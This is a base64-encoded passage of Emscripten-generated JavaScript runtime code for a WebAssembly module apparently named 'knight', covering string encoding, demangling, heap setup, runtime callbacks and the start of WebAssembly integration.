OCB8IHUgPj4gMTIgJiA2MzsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ID4+IDYgJiA2MzsKICAgICAgICAgICAgb3V0VThBcnJheVtvdXRJZHgrK10gPSAxMjggfCB1ICYgNjMKICAgICAgICB9CiAgICB9CiAgICBvdXRVOEFycmF5W291dElkeF0gPSAwOwogICAgcmV0dXJuIG91dElkeCAtIHN0YXJ0SWR4Cn0KCk1vZHVsZVsic3RyaW5nVG9VVEY4QXJyYXkiXSA9IHN0cmluZ1RvVVRGOEFycmF5OwoKZnVuY3Rpb24gc3RyaW5nVG9VVEY4KHN0ciwgb3V0UHRyLCBtYXhCeXRlc1RvV3JpdGUpIHsKICAgIHJldHVybiBzdHJpbmdUb1VURjhBcnJheShzdHIsIEhFQVBVOCwgb3V0UHRyLCBtYXhCeXRlc1RvV3JpdGUpCn0KCk1vZHVsZVsic3RyaW5nVG9VVEY4Il0gPSBzdHJpbmdUb1VURjg7CgpmdW5jdGlvbiBsZW5ndGhCeXRlc1VURjgoc3RyKSB7CiAgICB2YXIgbGVuID0gMDsKICAgIGZvcih2YXIgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyArK2kpIHsKICAgICAgICB2YXIgdSA9IHN0ci5jaGFyQ29kZUF0KGkpOwogICAgICAgIGlmKHUgPj0gNTUyOTYgJiYgdSA8PSA1NzM0MykgdSA9IDY1NTM2ICsgKCh1ICYgMTAyMykgPDwgMTApIHwgc3RyLmNoYXJDb2RlQXQoKytpKSAmIDEwMjM7CiAgICAgICAgaWYodSA8PSAxMjcpIHsKICAgICAgICAgICAgKytsZW4KICAgICAgICB9IGVsc2UgaWYodSA8PSAyMDQ3KSB7CiAgICAgICAgICAgIGxlbiArPSAyCiAgICAgICAgfSBlbHNlIGlmKHUgPD0gNjU1MzUpIHsKICAgICAgICAgICAgbGVuICs9IDMKICAgICAgICB9IGVsc2UgaWYodSA8PSAyMDk3MTUxKSB7CiAgICAgICAgICAgIGxlbiArPSA0CiAgICAgICAgfSBlbHNlIGlmKHUgPD0gNjcxMDg4NjMpIHsKICAgICAgICAgICAgbGVuICs9IDUKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBsZW4gKz0gNgogICAgICAgIH0KICAgIH0KICAgIHJldHVybiBsZW4KfQoKTW9kdWxlWyJsZW5ndGhCeXRlc1VURjgiXSA9IGxlbmd0aEJ5dGVzVVRGODsKdmFyIFVURjE2RGVjb2RlciA9IHR5cGVvZiBUZXh0RGVjb2RlciAhPT0gInVuZGVmaW5lZCIgPyBuZXcgVGV4dERlY29kZXIoInV0Zi0xNmxlIikgOiB1bmRlZmluZWQ7CgpmdW5jdGlvbiBkZW1hbmdsZShmdW5jKSB7CiAgICB2YXIgX19jeGFfZGVtYW5nbGVfZnVuYyA9IE1vZHVsZVsiX19fY3hhX2RlbWFuZ2xlIl0gfHwgTW9kdWxlWyJfX2N4YV9kZW1hbmdsZSJdOwogICAgaWYoX19jeGFfZGVtYW5nbGVfZnVuYykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBzID0gZnVuYy5zdWJzdHIoMSk7CiAgICAgICAgICAgIHZhciBsZW4gPSBsZW5ndGhCeXRlc1VURjgocykgKyAxOwogICAgICAgICAgICB2YXIgYnVmID0gX21hbGxvYyhsZW4pOwogICAgICAgICAgICBzdHJpbmdUb1VURjgocywgYnVmLCBsZW4pOwogICAgICAgICAgICB2YXIgc3RhdHVzID0gX21hbGxvYyg0KTsKICAgICAgICAgICAgdmFyIHJldCA9IF9fY3hhX2RlbWFuZ2xlX2Z1bmMoYnVmLCAwLCAwLCBzdGF0dXMpOwogICAgICAgICAgICBpZihnZXRWYWx1ZShzdGF0dXMsICJpMzIiKSA9PT0gMCAmJiByZXQpIHsKICAgICAgICAgICAgICAgIHJldHVybiBQb2ludGVyX3N0cmluZ2lmeShyZXQpCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICB9IGZpbmFsbHkgewogICAgICAgICAgICBpZihidWYpIF9mcmVlKGJ1Zik7CiAgICAgICAgICAgIGlmKHN0YXR1cykgX2ZyZWUoc3RhdHVzKTsKICAgICAgICAgICAgaWYocmV0KSBfZnJlZShyZXQpCiAgICAgICAgfQogICAgICAgIHJldHVybiBmdW5jCiAgICB9CiAgICBSdW50aW1lLndhcm5PbmNlKCJ3YXJuaW5nOiBidWlsZCB3aXRoIC1zIERFTUFOR0xFX1NVUFBPUlQ9MSB0byBsaW5rIGluIGxpYmN4eGFiaSBkZW1hbmdsaW5nIik7CiAgICByZXR1cm4gZnVuYwp9CgpmdW5jdGlvbiBkZW1hbmdsZUFsbCh0ZXh0KSB7CiAgICB2YXIgcmVnZXggPSAvX19aW1x3XGRfXSsvZzsKICAgIHJldHVybiB0ZXh0LnJlcGxhY2UocmVnZXgsIChmdW5jdGlvbih4KSB7CiAgICAgICAgdmFyIHkgPSBkZW1hbmdsZSh4KTsKICAgICAgICByZXR1cm4geCA9PT0geSA/IHggOiB4ICsgIiBbIiArIHkgKyAiXSIKICAgIH0pKQp9CgpmdW5jdGlvbiBqc1N0YWNrVHJhY2UoKSB7CiAgICB2YXIgZXJyID0gbmV3IEVycm9yOwogICAgaWYoIWVyci5zdGFjaykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigwKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICBlcnIgPSBlCiAgICAgICAgfQogICAgICAgIGlmKCFlcnIuc3RhY2spIHsKICAgICAgICAgICAgcmV0dXJuICIobm8gc3RhY2sgdHJhY2UgYXZhaWxhYmxlKSIKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gZXJyLnN0YWNrLnRvU3RyaW5nKCkKfQoKZnVuY3Rpb24gc3RhY2tUcmFjZSgpIHsKICAgIHZhciBqcyA9IGpzU3RhY2tUcmFjZSgpOwogICAgaWYoTW9kdWxlWyJleHRyYVN0YWNrVHJhY2UiXSkganMgKz0gIlxuIiArIE1vZHVsZVsiZXh0cmFTdGFja1RyYWNlIl0oKTsKICAgIHJldHVybiBkZW1hbmdsZUFsbChqcykKfQoKTW9kdWxlWyJzdGFja1RyYWNlIl0gPSBzdGFja1RyYWNlOwp2YXIgV0FTTV9QQUdFX1NJWkUgPSA2NTUzNjsKdmFyIEFTTUpTX1BBR0VfU0laRSA9IDE2Nzc3MjE2OwoKZnVuY3Rpb24gYWxpZ25VcCh4LCBtdWx0aXBsZSkgewogICAgaWYoeCAlIG11bHRpcGxlID4gMCkgewogICAgICAgIHggKz0gbXVsdGlwbGUgLSB4ICUgbXVsdGlwbGUKICAgIH0KICAgIHJldHVybiB4Cn0KCnZhciBIRUFQLCBidWZmZXIsIEhFQVA4LCBIRUFQVTgsIEhFQVAxNiwgSEVBUFUxNiwgSEVBUDMyLCBIRUFQVTMyLCBIRUFQRjMyLCBIRUFQRjY0OwoKZnVuY3Rpb24gdXBkYXRlR2xvYmFsQnVmZmVyKGJ1ZikgewogICAgTW9kdWxlWyJidWZmZXIiXSA9IGJ1ZmZlciA9IGJ1Zgp9CgpmdW5jdGlvbiB1cGRhdGVHbG9iYWxCdWZmZXJWaWV3cygpIHsKICAgIE1vZHVsZVsiSEVBUDgiXSA9IEhFQVA4ID0gbmV3IEludDhBcnJheShidWZmZXIpOwogICAgTW9kdWxlWyJIRUFQMTYiXSA9IEhFQVAxNiA9IG5ldyBJbnQxNkFycmF5KGJ1ZmZlcik7CiAgICBNb2R1bGVbIkhFQVAzMiJdID0gSEVBUDMyID0gbmV3IEludDMyQXJyYXkoYnVmZmVyKTsKICAgIE1vZHVsZVsiSEVBUFU4Il0gPSBIRUFQVTggPSBuZXcgVWludDhBcnJheShidWZmZXIpOwogICAgTW9kdWxlWyJIRUFQVTE2Il0gPSBIRUFQVTE2ID0gbmV3IFVpbnQxNkFycmF5KGJ1ZmZlcik7CiAgICBNb2R1bGVbIkhFQVBVMzIiXSA9IEhFQVBVMzIgPSBuZXcgVWludDMyQXJyYXkoYnVmZmVyKTsKICAgIE1vZHVsZVsiSEVBUEYzMiJdID0gSEVBUEYzMiA9IG5ldyBGbG9hdDMyQXJyYXkoYnVmZmVyKTsKICAgIE1vZHVsZVsiSEVBUEY2NCJdID0gSEVBUEY2NCA9IG5ldyBGbG9hdDY0QXJyYXkoYnVmZmVyKQp9Cgp2YXIgU1RBVElDX0JBU0UsIFNUQVRJQ1RPUCwgc3RhdGljU2VhbGVkOwp2YXIgU1RBQ0tfQkFTRSwgU1RBQ0tUT1AsIFNUQUNLX01BWDsKdmFyIERZTkFNSUNfQkFTRSwgRFlOQU1JQ1RPUF9QVFI7ClNUQVRJQ19CQVNFID0gU1RBVElDVE9QID0gU1RBQ0tfQkFTRSA9IFNUQUNLVE9QID0gU1RBQ0tfTUFYID0gRFlOQU1JQ19CQVNFID0gRFlOQU1JQ1RPUF9QVFIgPSAwOwpzdGF0aWNTZWFsZWQgPSBmYWxzZTsKCmZ1bmN0aW9uIGFib3J0T25DYW5ub3RHcm93TWVtb3J5KCkgewogICAgYWJvcnQoIkNhbm5vdCBlbmxhcmdlIG1lbW9yeSBhcnJheXMuIEVpdGhlciAoMSkgY29tcGlsZSB3aXRoIC1zIFRPVEFMX01FTU9SWT1YIHdpdGggWCBoaWdoZXIgdGhhbiB0aGUgY3VycmVudCB2YWx1ZSAiICsgVE9UQUxfTUVNT1JZICsgIiwgKDIpIGNvbXBpbGUgd2l0aCAtcyBBTExPV19NRU1PUllfR1JPV1RIPTEgd2hpY2ggYWxsb3dzIGluY3JlYXNpbmcgdGhlIHNpemUgYXQgcnVudGltZSwgb3IgKDMpIGlmIHlvdSB3YW50IG1hbGxvYyB0byByZXR1cm4gTlVMTCAoMCkgaW5zdGVhZCBvZiB0aGlzIGFib3J0LCBjb21waWxlIHdpdGggLXMgQUJPUlRJTkdfTUFMTE9DPTAgIikKfQoKZnVuY3Rpb24gZW5sYXJnZU1lbW9yeSgpIHsKICAgIGFib3J0T25DYW5ub3RHcm93TWVtb3J5KCkKfQoKdmFyIFRPVEFMX1NUQUNLID0gTW9kdWxlWyJUT1RBTF9TVEFDSyJdIHx8IDUyNDI4ODA7CnZhciBUT1RBTF9NRU1PUlkgPSBNb2R1bGVbIlRPVEFMX01FTU9SWSJdIHx8IDE2Nzc3MjE2OwppZihUT1RBTF9NRU1PUlkgPCBUT1RBTF9TVEFDSykgTW9kdWxlLnByaW50RXJyKCJUT1RBTF9NRU1PUlkgc2hvdWxkIGJlIGxhcmdlciB0aGFuIFRPVEFMX1NUQUNLLCB3YXMgIiArIFRPVEFMX01FTU9SWSArICIhIChUT1RBTF9TVEFDSz0iICsgVE9UQUxfU1RBQ0sgKyAiKSIpOwppZihNb2R1bGVbImJ1ZmZlciJdKSB7CiAgICBidWZmZXIgPSBNb2R1bGVbImJ1ZmZlciJdCn0gZWxzZSB7CiAgICBpZih0eXBlb2YgV2ViQXNzZW1ibHkgPT09ICJvYmplY3QiICYmIHR5cGVvZiBXZWJBc3NlbWJseS5NZW1vcnkgPT09ICJmdW5jdGlvbiIpIHsKICAgICAgICBNb2R1bGVbIndhc21NZW1vcnkiXSA9IG5ldyBXZWJBc3NlbWJseS5NZW1vcnkoewogICAgICAgICAgICAiaW5pdGlhbCI6IFRPVEFMX01FTU9SWSAvIFdBU01fUEFHRV9TSVpFLAogICAgICAgICAgICAibWF4aW11bSI6IFRPVEFMX01FTU9SWSAvIFdBU01fUEFHRV9TSVpFCiAgICAgICAgfSk7CiAgICAgICAgYnVmZmVyID0gTW9kdWxlWyJ3YXNtTWVtb3J5Il0uYnVmZmVyCiAgICB9IGVsc2UgewogICAgICAgIGJ1ZmZlciA9IG5ldyBBcnJheUJ1ZmZlcihUT1RBTF9NRU1PUlkpCiAgICB9Cn0KdXBkYXRlR2xvYmFsQnVmZmVyVmlld3MoKTsKCmZ1bmN0aW9uIGdldFRvdGFsTWVtb3J5KCkgewogICAgcmV0dXJuIFRPVEFMX01FTU9SWQp9CgpIRUFQMzJbMF0gPSAxNjY4NTA5MDI5OwpIRUFQMTZbMV0gPSAyNTQ1OTsKaWYoSEVBUFU4WzJdICE9PSAxMTUgfHwgSEVBUFU4WzNdICE9PSA5OSkgdGhyb3ciUnVudGltZSBlcnJvcjogZXhwZWN0ZWQgdGhlIHN5c3RlbSB0byBiZSBsaXR0bGUtZW5kaWFuISI7Ck1vZHVsZVsiSEVBUCJdID0gSEVBUDsKTW9kdWxlWyJidWZmZXIiXSA9IGJ1ZmZlcjsKTW9kdWxlWyJIRUFQOCJdID0gSEVBUDg7Ck1vZHVsZVsiSEVBUDE2Il0gPSBIRUFQMTY7Ck1vZHVsZVsiSEVBUDMyIl0gPSBIRUFQMzI7Ck1vZHVsZVsiSEVBUFU4Il0gPSBIRUFQVTg7Ck1vZHVsZVsiSEVBUFUxNiJdID0gSEVBUFUxNjsKTW9kdWxlWyJIRUFQVTMyIl0gPSBIRUFQVTMyOwpNb2R1bGVbIkhFQVBGMzIiXSA9IEhFQVBGMzI7Ck1vZHVsZVsiSEVBUEY2NCJdID0gSEVBUEY2NDsKCmZ1bmN0aW9uIGNhbGxSdW50aW1lQ2FsbGJhY2tzKGNhbGxiYWNrcykgewogICAgd2hpbGUoY2FsbGJhY2tzLmxlbmd0aCA+IDApIHsKICAgICAgICB2YXIgY2FsbGJhY2sgPSBjYWxsYmFja3Muc2hpZnQoKTsKICAgICAgICBpZih0eXBlb2YgY2FsbGJhY2sgPT0gImZ1bmN0aW9uIikgewogICAgICAgICAgICBjYWxsYmFjaygpOwogICAgICAgICAgICBjb250aW51ZQogICAgICAgIH0KICAgICAgICB2YXIgZnVuYyA9IGNhbGxiYWNrLmZ1bmM7CiAgICAgICAgaWYodHlwZW9mIGZ1bmMgPT09ICJudW1iZXIiKSB7CiAgICAgICAgICAgIGlmKGNhbGxiYWNrLmFyZyA9PT0gdW5kZWZpbmVkKSB7CiAgICAgICAgICAgICAgICBNb2R1bGVbImR5bkNhbGxfdiJdKGZ1bmMpCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBNb2R1bGVbImR5bkNhbGxfdmkiXShmdW5jLCBjYWxsYmFjay5hcmcpCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBmdW5jKGNhbGxiYWNrLmFyZyA9PT0gdW5kZWZpbmVkID8gbnVsbCA6IGNhbGxiYWNrLmFyZykKICAgICAgICB9CiAgICB9Cn0KCnZhciBfX0FUUFJFUlVOX18gPSBbXTsKdmFyIF9fQVRJTklUX18gPSBbXTsKdmFyIF9fQVRNQUlOX18gPSBbXTsKdmFyIF9fQVRFWElUX18gPSBbXTsKdmFyIF9fQVRQT1NUUlVOX18gPSBbXTsKdmFyIHJ1bnRpbWVJbml0aWFsaXplZCA9IGZhbHNlOwp2YXIgcnVudGltZUV4aXRlZCA9IGZhbHNlOwoKZnVuY3Rpb24gcHJlUnVuKCkgewogICAgaWYoTW9kdWxlWyJwcmVSdW4iXSkgewogICAgICAgIGlmKHR5cGVvZiBNb2R1bGVbInByZVJ1biJdID09ICJmdW5jdGlvbiIpIE1vZHVsZVsicHJlUnVuIl0gPSBbTW9kdWxlWyJwcmVSdW4iXV07CiAgICAgICAgd2hpbGUoTW9kdWxlWyJwcmVSdW4iXS5sZW5ndGgpIHsKICAgICAgICAgICAgYWRkT25QcmVSdW4oTW9kdWxlWyJwcmVSdW4iXS5zaGlmdCgpKQogICAgICAgIH0KICAgIH0KICAgIGNhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRQUkVSVU5fXykKfQoKZnVuY3Rpb24gZW5zdXJlSW5pdFJ1bnRpbWUoKSB7CiAgICBpZihydW50aW1lSW5pdGlhbGl6ZWQpIHJldHVybjsKICAgIHJ1bnRpbWVJbml0aWFsaXplZCA9IHRydWU7CiAgICBjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUSU5JVF9fKQp9CgpmdW5jdGlvbiBwcmVNYWluKCkgewogICAgY2FsbFJ1bnRpbWVDYWxsYmFja3MoX19BVE1BSU5fXykKfQoKZnVuY3Rpb24gZXhpdFJ1bnRpbWUoKSB7CiAgICBjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FURVhJVF9fKTsKICAgIHJ1bnRpbWVFeGl0ZWQgPSB0cnVlCn0KCmZ1bmN0aW9uIHBvc3RSdW4oKSB7CiAgICBpZihNb2R1bGVbInBvc3RSdW4iXSkgewogICAgICAgIGlmKHR5cGVvZiBNb2R1bGVbInBvc3RSdW4iXSA9PSAiZnVuY3Rpb24iKSBNb2R1bGVbInBvc3RSdW4iXSA9IFtNb2R1bGVbInBvc3RSdW4iXV07CiAgICAgICAgd2hpbGUoTW9kdWxlWyJwb3N0UnVuIl0ubGVuZ3RoKSB7CiAgICAgICAgICAgIGFkZE9uUG9zdFJ1bihNb2R1bGVbInBvc3RSdW4iXS5zaGlmdCgpKQogICAgICAgIH0KICAgIH0KICAgIGNhbGxSdW50aW1lQ2FsbGJhY2tzKF9fQVRQT1NUUlVOX18pCn0KCmZ1bmN0aW9uIGFkZE9uUHJlUnVuKGNiKSB7CiAgICBfX0FUUFJFUlVOX18udW5zaGlmdChjYikKfQoKTW9kdWxlWyJhZGRPblByZVJ1biJdID0gYWRkT25QcmVSdW47CgpmdW5jdGlvbiBhZGRPbkluaXQoY2IpIHsKICAgIF9fQVRJTklUX18udW5zaGlmdChjYikKfQoKTW9kdWxlWyJhZGRPbkluaXQiXSA9IGFkZE9uSW5pdDsKCmZ1bmN0aW9uIGFkZE9uUHJlTWFpbihjYikgewogICAgX19BVE1BSU5fXy51bnNoaWZ0KGNiKQp9CgpNb2R1bGVbImFkZE9uUHJlTWFpbiJdID0gYWRkT25QcmVNYWluOwoKZnVuY3Rpb24gYWRkT25FeGl0KGNiKSB7CiAgICBfX0FURVhJVF9fLnVuc2hpZnQoY2IpCn0KCk1vZHVsZVsiYWRkT25FeGl0Il0gPSBhZGRPbkV4aXQ7CgpmdW5jdGlvbiBhZGRPblBvc3RSdW4oY2IpIHsKICAgIF9fQVRQT1NUUlVOX18udW5zaGlmdChjYikKfQoKTW9kdWxlWyJhZGRPblBvc3RSdW4iXSA9IGFkZE9uUG9zdFJ1bjsKCmZ1bmN0aW9uIGludEFycmF5RnJvbVN0cmluZyhzdHJpbmd5LCBkb250QWRkTnVsbCwgbGVuZ3RoKSB7CiAgICB2YXIgbGVuID0gbGVuZ3RoID4gMCA/IGxlbmd0aCA6IGxlbmd0aEJ5dGVzVVRGOChzdHJpbmd5KSArIDE7CiAgICB2YXIgdThhcnJheSA9IG5ldyBBcnJheShsZW4pOwogICAgdmFyIG51bUJ5dGVzV3JpdHRlbiA9IHN0cmluZ1RvVVRGOEFycmF5KHN0cmluZ3ksIHU4YXJyYXksIDAsIHU4YXJyYXkubGVuZ3RoKTsKICAgIGlmKGRvbnRBZGROdWxsKSB1OGFycmF5Lmxlbmd0aCA9IG51bUJ5dGVzV3JpdHRlbjsKICAgIHJldHVybiB1OGFycmF5Cn0KCk1vZHVsZVsiaW50QXJyYXlGcm9tU3RyaW5nIl0gPSBpbnRBcnJheUZyb21TdHJpbmc7CgpmdW5jdGlvbiBpbnRBcnJheVRvU3RyaW5nKGFycmF5KSB7CiAgICB2YXIgcmV0ID0gW107CiAgICBmb3IodmFyIGkgPSAwOyBpIDwgYXJyYXkubGVuZ3RoOyBpKyspIHsKICAgICAgICB2YXIgY2hyID0gYXJyYXlbaV07CiAgICAgICAgaWYoY2hyID4gMjU1KSB7CiAgICAgICAgICAgIGNociAmPSAyNTUKICAgICAgICB9CiAgICAgICAgcmV0LnB1c2goU3RyaW5nLmZyb21DaGFyQ29kZShjaHIpKQogICAgfQogICAgcmV0dXJuIHJldC5qb2luKCIiKQp9CgpNb2R1bGVbImludEFycmF5VG9TdHJpbmciXSA9IGludEFycmF5VG9TdHJpbmc7CgpmdW5jdGlvbiB3cml0ZVN0cmluZ1RvTWVtb3J5KHN0cmluZywgYnVmZmVyLCBkb250QWRkTnVsbCkgewogICAgUnVudGltZS53YXJuT25jZSgid3JpdGVTdHJpbmdUb01lbW9yeSBpcyBkZXByZWNhdGVkIGFuZCBzaG91bGQgbm90IGJlIGNhbGxlZCEgVXNlIHN0cmluZ1RvVVRGOCgpIGluc3RlYWQhIik7CiAgICB2YXIgbGFzdENoYXIsIGVuZDsKICAgIGlmKGRvbnRBZGROdWxsKSB7CiAgICAgICAgZW5kID0gYnVmZmVyICsgbGVuZ3RoQnl0ZXNVVEY4KHN0cmluZyk7CiAgICAgICAgbGFzdENoYXIgPSBIRUFQOFtlbmRdCiAgICB9CiAgICBzdHJpbmdUb1VURjgoc3RyaW5nLCBidWZmZXIsIEluZmluaXR5KTsKICAgIGlmKGRvbnRBZGROdWxsKSBIRUFQOFtlbmRdID0gbGFzdENoYXIKfQoKTW9kdWxlWyJ3cml0ZVN0cmluZ1RvTWVtb3J5Il0gPSB3cml0ZVN0cmluZ1RvTWVtb3J5OwoKZnVuY3Rpb24gd3JpdGVBcnJheVRvTWVtb3J5KGFycmF5LCBidWZmZXIpIHsKICAgIEhFQVA4LnNldChhcnJheSwgYnVmZmVyKQp9CgpNb2R1bGVbIndyaXRlQXJyYXlUb01lbW9yeSJdID0gd3JpdGVBcnJheVRvTWVtb3J5OwoKZnVuY3Rpb24gd3JpdGVBc2NpaVRvTWVtb3J5KHN0ciwgYnVmZmVyLCBkb250QWRkTnVsbCkgewogICAgZm9yKHZhciBpID0gMDsgaSA8IHN0ci5sZW5ndGg7ICsraSkgewogICAgICAgIEhFQVA4W2J1ZmZlcisrID4+IDBdID0gc3RyLmNoYXJDb2RlQXQoaSkKICAgIH0KICAgIGlmKCFkb250QWRkTnVsbCkgSEVBUDhbYnVmZmVyID4+IDBdID0gMAp9CgpNb2R1bGVbIndyaXRlQXNjaWlUb01lbW9yeSJdID0gd3JpdGVBc2NpaVRvTWVtb3J5OwppZighTWF0aFsiaW11bCJdIHx8IE1hdGhbImltdWwiXSg0Mjk0OTY3Mjk1LCA1KSAhPT0gLTUpIE1hdGhbImltdWwiXSA9IGZ1bmN0aW9uIGltdWwoYSwgYikgewogICAgdmFyIGFoID0gYSA+Pj4gMTY7CiAgICB2YXIgYWwgPSBhICYgNjU1MzU7CiAgICB2YXIgYmggPSBiID4+PiAxNjsKICAgIHZhciBibCA9IGIgJiA2NTUzNTsKICAgIHJldHVybiBhbCAqIGJsICsgKGFoICogYmwgKyBhbCAqIGJoIDw8IDE2KSB8IDAKfTsKTWF0aC5pbXVsID0gTWF0aFsiaW11bCJdOwppZighTWF0aFsiZnJvdW5kIl0pIHsKICAgIHZhciBmcm91bmRCdWZmZXIgPSBuZXcgRmxvYXQzMkFycmF5KDEpOwogICAgTWF0aFsiZnJvdW5kIl0gPSAoZnVuY3Rpb24oeCkgewogICAgICAgIGZyb3VuZEJ1ZmZlclswXSA9IHg7CiAgICAgICAgcmV0dXJuIGZyb3VuZEJ1ZmZlclswXQogICAgfSkKfQpNYXRoLmZyb3VuZCA9IE1hdGhbImZyb3VuZCJdOwppZighTWF0aFsiY2x6MzIiXSkgTWF0aFsiY2x6MzIiXSA9IChmdW5jdGlvbih4KSB7CiAgICB4ID0geCA+Pj4gMDsKICAgIGZvcih2YXIgaSA9IDA7IGkgPCAzMjsgaSsrKSB7CiAgICAgICAgaWYoeCAmIDEgPDwgMzEgLSBpKSByZXR1cm4gaQogICAgfQogICAgcmV0dXJuIDMyCn0pOwpNYXRoLmNsejMyID0gTWF0aFsiY2x6MzIiXTsKaWYoIU1hdGhbInRydW5jIl0pIE1hdGhbInRydW5jIl0gPSAoZnVuY3Rpb24oeCkgewogICAgcmV0dXJuIHggPCAwID8gTWF0aC5jZWlsKHgpIDogTWF0aC5mbG9vcih4KQp9KTsKTWF0aC50cnVuYyA9IE1hdGhbInRydW5jIl07CnZhciBNYXRoX2FicyA9IE1hdGguYWJzOwp2YXIgTWF0aF9jb3MgPSBNYXRoLmNvczsKdmFyIE1hdGhfc2luID0gTWF0aC5zaW47CnZhciBNYXRoX3RhbiA9IE1hdGgudGFuOwp2YXIgTWF0aF9hY29zID0gTWF0aC5hY29zOwp2YXIgTWF0aF9hc2luID0gTWF0aC5hc2luOwp2YXIgTWF0aF9hdGFuID0gTWF0aC5hdGFuOwp2YXIgTWF0aF9hdGFuMiA9IE1hdGguYXRhbjI7CnZhciBNYXRoX2V4cCA9IE1hdGguZXhwOwp2YXIgTWF0aF9sb2cgPSBNYXRoLmxvZzsKdmFyIE1hdGhfc3FydCA9IE1hdGguc3FydDsKdmFyIE1hdGhfY2VpbCA9IE1hdGguY2VpbDsKdmFyIE1hdGhfZmxvb3IgPSBNYXRoLmZsb29yOwp2YXIgTWF0aF9wb3cgPSBNYXRoLnBvdzsKdmFyIE1hdGhfaW11bCA9IE1hdGguaW11bDsKdmFyIE1hdGhfZnJvdW5kID0gTWF0aC5mcm91bmQ7CnZhciBNYXRoX3JvdW5kID0gTWF0aC5yb3VuZDsKdmFyIE1hdGhfbWluID0gTWF0aC5taW47CnZhciBNYXRoX2NsejMyID0gTWF0aC5jbHozMjsKdmFyIE1hdGhfdHJ1bmMgPSBNYXRoLnRydW5jOwp2YXIgcnVuRGVwZW5kZW5jaWVzID0gMDsKdmFyIHJ1bkRlcGVuZGVuY3lXYXRjaGVyID0gbnVsbDsKdmFyIGRlcGVuZGVuY2llc0Z1bGZpbGxlZCA9IG51bGw7CgpmdW5jdGlvbiBnZXRVbmlxdWVSdW5EZXBlbmRlbmN5KGlkKSB7CiAgICByZXR1cm4gaWQKfQoKZnVuY3Rpb24gYWRkUnVuRGVwZW5kZW5jeShpZCkgewogICAgcnVuRGVwZW5kZW5jaWVzKys7CiAgICBpZihNb2R1bGVbIm1vbml0b3JSdW5EZXBlbmRlbmNpZXMiXSkgewogICAgICAgIE1vZHVsZVsibW9uaXRvclJ1bkRlcGVuZGVuY2llcyJdKHJ1bkRlcGVuZGVuY2llcykKICAgIH0KfQoKTW9kdWxlWyJhZGRSdW5EZXBlbmRlbmN5Il0gPSBhZGRSdW5EZXBlbmRlbmN5OwoKZnVuY3Rpb24gcmVtb3ZlUnVuRGVwZW5kZW5jeShpZCkgewogICAgcnVuRGVwZW5kZW5jaWVzLS07CiAgICBpZihNb2R1bGVbIm1vbml0b3JSdW5EZXBlbmRlbmNpZXMiXSkgewogICAgICAgIE1vZHVsZVsibW9uaXRvclJ1bkRlcGVuZGVuY2llcyJdKHJ1bkRlcGVuZGVuY2llcykKICAgIH0KICAgIGlmKHJ1bkRlcGVuZGVuY2llcyA9PSAwKSB7CiAgICAgICAgaWYocnVuRGVwZW5kZW5jeVdhdGNoZXIgIT09IG51bGwpIHsKICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChydW5EZXBlbmRlbmN5V2F0Y2hlcik7CiAgICAgICAgICAgIHJ1bkRlcGVuZGVuY3lXYXRjaGVyID0gbnVsbAogICAgICAgIH0KICAgICAgICBpZihkZXBlbmRlbmNpZXNGdWxmaWxsZWQpIHsKICAgICAgICAgICAgdmFyIGNhbGxiYWNrID0gZGVwZW5kZW5jaWVzRnVsZmlsbGVkOwogICAgICAgICAgICBkZXBlbmRlbmNpZXNGdWxmaWxsZWQgPSBudWxsOwogICAgICAgICAgICBjYWxsYmFjaygpCiAgICAgICAgfQogICAgfQp9CgpNb2R1bGVbInJlbW92ZVJ1bkRlcGVuZGVuY3kiXSA9IHJlbW92ZVJ1bkRlcGVuZGVuY3k7Ck1vZHVsZVsicHJlbG9hZGVkSW1hZ2VzIl0gPSB7fTsKTW9kdWxlWyJwcmVsb2FkZWRBdWRpb3MiXSA9IHt9Owp2YXIgbWVtb3J5SW5pdGlhbGl6ZXIgPSBudWxsOwoKZnVuY3Rpb24gaW50ZWdyYXRlV2FzbUpTKE1vZHVsZSkgewogICAgdmFyIG1ldGhvZCA9IE1vZHVsZVsid2FzbUpTTWV0aG9kIl0gfHwgIm5hdGl2ZS13YXNtIjsKICAgIE1vZHVsZVsid2FzbUpTTWV0aG9kIl0gPSBtZXRob2Q7CiAgICB2YXIgd2FzbVRleHRGaWxlID0gTW9kdWxlWyJ3YXNtVGV4dEZpbGUiXSB8fCAia25pZ2h0Lndhc3QiOwogICAgdmFyIHdhc21CaW5hcnlGaWxlID0gTW9kdWxlWyJ3YXNtQmluYXJ5RmlsZSJdIHx8ICJrbmlnaHQud2FzbSI7CiAgICB2YXIgYXNtanNDb2RlRmlsZSA9IE1vZHVsZVsiYXNtanNDb2RlRmlsZSJdIHx8ICJrbmlnaHQudGVtcC5hc20uanMiOwogICAgaWYodHlwZW9mIE1vZHVsZVsibG9jYXRlRmlsZSJdID09PSAiZnVuY3Rpb24iKSB7CiAgICAgICAgd2FzbVRleHRGaWxlID0gTW9kdWxlWyJsb2NhdGVGaWxlIl0od2FzbVRleHRGaWxlKTsKICAgICAgICB3YXNtQmluYXJ5RmlsZSA9IE1vZHVsZVsibG9jYXRlRmlsZSJdKHdhc21CaW5hcnlGaWxlKTsKICAgICAgICBhc21qc0NvZGVGaWxlID0gTW9kdWxlWyJsb2NhdGVGaWxlIl0oYXNtanNDb2RlRmlsZSkKICAgIH0KICAgIHZhciB3YXNtUGFnZVNpemUgPSA2NCAqIDEwMjQ7CiAgICB2YXIgYXNtMndhc21JbXBvcnRzID0gewogICAgICAgICJmNjQtcmVtIjogKGZ1bmN0aW9uKHgsIHkpIHsKICAgICAgICAgICAgcmV0dXJuIHggJSB5CiAgICAgICAgfSksICJmNjQtdG8taW50IjogKGZ1bmN0aW9uKHgpIHsKICAgICAgICAgICAgcmV0dXJuIHggfCAw